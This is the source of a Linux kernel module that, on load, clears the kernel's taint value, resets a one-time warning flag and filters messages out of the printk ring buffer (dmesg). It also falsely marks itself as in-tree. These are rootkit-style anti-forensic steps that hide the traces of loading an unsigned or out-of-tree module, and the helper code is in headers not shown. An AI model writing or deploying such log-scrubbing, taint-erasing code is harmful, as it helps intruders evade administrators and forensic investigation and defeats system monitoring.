#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "filter_dmesg.h"
#include "untaint.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("bah");
MODULE_DESCRIPTION("removes messages from the printk ringbuffer");
MODULE_VERSION("1.0");
MODULE_INFO(intree, "true");

static unsigned long int taint_value = 0;
module_param(taint_value, long, 0);
MODULE_PARM_DESC(taint_value, "Taint Value");

static unsigned long int already_done_offset = 0;
module_param(already_done_offset, long, 0);
MODULE_PARM_DESC(already_done_offset, "offset to the already_done to reset");


static int mod_init(void)
{
    printk(KERN_INFO "Loaded\n");
    untaint_kernel(taint_value);
    reset_already_done(already_done_offset);
    return filter_dmesg();
}

static void mod_exit(void) {
    printk(KERN_INFO "Unloading\n");
}


module_init(mod_init);
module_exit(mod_exit);
